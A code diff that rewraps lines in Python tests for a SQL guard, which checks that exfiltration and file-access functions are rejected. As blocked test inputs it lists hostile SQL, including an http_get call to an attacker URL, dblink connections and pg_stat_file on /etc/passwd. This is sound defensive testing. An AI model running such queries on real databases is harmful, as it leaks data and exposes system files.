@@ -74,7 +74,10 @@ def test_sql_guard_blocks_network_and_exfiltration_functions() -> None:
         ("SELECT http_get('http://attacker.com/leak') FROM gold.price_monthly_best;", "http_get"),
         ("SELECT dblink('dbname=target', 'SELECT 1') FROM gold.price_monthly_best;", "dblink"),
         ("SELECT dblink_connect('conn_str') FROM gold.price_monthly_best;", "dblink"),
-        ("SELECT query_to_xml('SELECT * FROM gold.price_monthly_best', true, false, '') FROM gold.price_monthly_best;", "query_to_xml"),
+        (
+            "SELECT query_to_xml('SELECT * FROM gold.price_monthly_best', true, false, '') FROM gold.price_monthly_best;",
+            "query_to_xml",
+        ),
         ("SELECT pg_ls_dir('/etc') FROM gold.price_monthly_best;", "pg_ls_dir"),
         ("SELECT pg_stat_file('/etc/passwd') FROM gold.price_monthly_best;", "pg_stat_file"),
         ("SELECT crosstab('SELECT 1, 2, 3') FROM gold.price_monthly_best;", "crosstab"),
@@ -84,7 +87,9 @@ def test_sql_guard_blocks_network_and_exfiltration_functions() -> None:
         with pytest.raises(SqlGuardError) as exc_info:
             validate_and_sanitize_sql(sql)
         assert exc_info.value.violation_code in ("FORBIDDEN_FUNCTION", "ACCESS_DENIED")
-        assert "interdite" in str(exc_info.value).lower() or "interdit" in str(exc_info.value).lower()
+        assert (
+            "interdite" in str(exc_info.value).lower() or "interdit" in str(exc_info.value).lower()
+        )
 
 
 def test_sql_guard_blocks_select_into() -> None:
@@ -247,7 +252,16 @@ def test_tool_catalog_get_market_facts(mock_exec: MagicMock) -> None:
     """Verify get_market_facts queries price changes and volatility."""
     mock_exec.return_value = QueryResult(
         sql="SELECT ...",
-        columns=["month", "product_name", "location_name", "median_price", "chg_1m", "chg_12m", "z_score_robust", "vol_12"],
+        columns=[
+            "month",
+            "product_name",
+            "location_name",
+            "median_price",
+            "chg_1m",
+            "chg_12m",
+            "z_score_robust",
+            "vol_12",
+        ],
         rows=[
             {
                 "month": "2024-05",
